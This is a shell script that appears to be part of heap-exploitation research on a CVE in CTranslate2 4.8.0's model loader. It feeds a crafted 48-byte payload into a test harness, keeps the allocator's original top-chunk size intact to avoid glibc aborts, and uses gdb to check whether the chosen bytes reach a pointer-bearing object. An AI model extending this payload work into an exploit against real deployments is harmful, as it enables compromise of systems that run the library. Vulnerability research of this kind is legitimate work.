#!/bin/sh
# W7 bounded allocator-metadata probe for CVE-2026-102566 (2026-11-26).
#
# W2 preserved the initial top-chunk size at store offsets 24..31 but also
# crafted candidate sizes at *later* top positions; that run aborted in
# sysmalloc. This probe tests the untried case: preserve the exact original
# top size (0xd6f1 in this layout) and leave the remaining 16 written bytes
# as chosen 0x41. Question: does a 48-byte chosen store survive to a live
# pointer-bearing object? Offline, no network, no probe off loopback.
set -eu
cd "$(dirname "$0")"

SRC=src/CTranslate2-4.8.0
printf 'sha256 of upstream model.cc used by probe:\n'
sha256sum "$SRC/src/models/model.cc" | tee evidence/top-size-probe.sha256

# 48 bytes: 0..15 chosen, 16..23 zero (top prev_size, unused),
# 24..31 exact original top size 0xd6f1, 32..47 chosen 0x41 in free top space.
HEX=414141414141414141414141414141410000000000000000f1d600000000000041414141414141414141414141414141
mkdir -p evidence

./consumer-payload 48 "$HEX" > evidence/topsize-48-plain.out 2>&1 || true
printf 'plain: '
grep -m1 'load returned' evidence/topsize-48-plain.out || printf 'NO load returned\n'

gdb -q -batch \
  -ex 'set pagination off' \
  -ex 'break model.cc:657' \
  -ex "run 48 $HEX" \
  -ex 'set $b=(char*)variable.buffer()' \
  -ex 'printf "BUF1=%p\n",$b' \
  -ex 'x/10gx $b' \
  -ex 'continue' \
  -ex 'printf "BUF2=%p\n",(char*)variable.buffer()' \
  -ex 'x/16gx $b' \
  -ex 'bt 3' \
  --args ./consumer-payload 48 "$HEX" \
  > evidence/topsize-48-gdb.txt 2>&1 || true
printf 'gdb capture: evidence/topsize-48-gdb.txt\n'
